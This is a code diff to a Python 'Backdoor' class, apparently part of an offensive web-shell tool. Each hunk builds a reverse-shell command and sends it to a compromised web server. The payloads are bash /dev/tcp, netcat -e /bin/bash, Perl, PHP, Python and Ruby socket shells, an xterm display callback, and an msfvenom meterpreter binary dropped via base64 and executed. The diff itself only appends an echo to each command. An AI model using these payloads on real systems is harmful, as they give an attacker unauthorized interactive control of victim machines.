@@ -48,7 +48,7 @@ class Backdoor(object):
             msg += colored('\n[?] Press <return> when ready!', 'yellow')
             raw_input(msg.format(ip, port))
             for path in bash:
-                cmd = 'nohup {0} -c \'{0} -i >& /dev/tcp/{1}/{2} 0>&1\' &'.format(path, ip, port)
+                cmd = 'nohup {0} -c \'{0} -i >& /dev/tcp/{1}/{2} 0>&1\' &echo "\n"'.format(path, ip, port)
                 make_request.get_page_source(cmd)
                 if self.checkPort(port):
                     break
@@ -70,7 +70,7 @@ class Backdoor(object):
                 raw_input(msg.format(ip, port))
                 cprint('[i] Generating linux/x86/meterpreter/reverse_tcp', 'green')
                 shell = Popen('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf | base64'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
-                cmd = 'echo "{0}" | base64 -i -d > {1} && chmod +x {1} && nohup {1} &'.format(shell, path)
+                cmd = 'echo "{0}" | base64 -i -d > {1} && chmod +x {1} && nohup {1} &echo "\n"'.format(shell, path)
                 cprint('[+] Sending payload & executing', 'green')
                 make_request.get_page_source(cmd)
                 cprint('[+] Done!', 'blue')
@@ -93,7 +93,7 @@ class Backdoor(object):
             msg += colored('\n[?] Press <return> when ready!', 'yellow')
             raw_input(msg.format(ip, port))
             for path in netcat:
-                cmd = 'nohup {0} {1} {2} -e /bin/bash &'.format(path, ip, port)
+                cmd = 'nohup {0} {1} {2} -e /bin/bash &echo "\n"'.format(path, ip, port)
                 make_request.get_page_source(cmd)
                 if self.checkPort(port):
                     break
@@ -121,7 +121,7 @@ class Backdoor(object):
                 cmd += '$p="{0}";'.format(port)
                 cmd += 'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
                 cmd += 'if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");'
-                cmd += 'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' &'
+                cmd += 'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' & echo "\n"'
                 make_request.get_page_source(cmd)
                 if self.checkPort(port):
                     break
@@ -206,7 +206,7 @@ class Backdoor(object):
             for path in php:
                 cmd = 'nohup {0} -r '.format(path)
                 cmd += '\'$sock=fsockopen("{0}",{1});'.format(ip, port)
-                cmd += 'exec("/bin/sh -i <&3 >&3 2>&3");\' &'
+                cmd += 'exec("/bin/sh -i <&3 >&3 2>&3");\' &echo "\n"'
                 make_request.get_page_source(cmd)
                 if self.checkPort(port):
                     break
@@ -235,7 +235,7 @@ class Backdoor(object):
                 cmd += 'os.dup2(s.fileno(),0);'
                 cmd += 'os.dup2(s.fileno(),1);'
                 cmd += 'os.dup2(s.fileno(),2);'
-                cmd += 'p=subprocess.call(["/bin/sh","-i"]);\' &'
+                cmd += 'p=subprocess.call(["/bin/sh","-i"]);\' &echo "\n"'
                 make_request.get_page_source(cmd)
                 if self.checkPort(port):
                     break
@@ -259,7 +259,7 @@ class Backdoor(object):
             for path in ruby:
                 cmd = 'nohup {0} -rsocket -e'.format(path)
                 cmd += '\'f=TCPSocket.open("{0}",{1}).to_i;'.format(ip, port)
-                cmd += 'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\' &'
+                cmd += 'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\' &echo "\n"'
                 make_request.get_page_source(cmd)
                 if self.checkPort(port):
                     break
@@ -296,7 +296,7 @@ class Backdoor(object):
                 c += 1
             #raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
             for path in xterm:
-                cmd = 'nohup {0} xterm -display {1}:1 &'.format(path, ip)
+                cmd = 'nohup {0} xterm -display {1}:1 &echo "\n"'.format(path, ip)
                 make_request.get_page_source(cmd)
                 if self.checkPort(port):
                     break
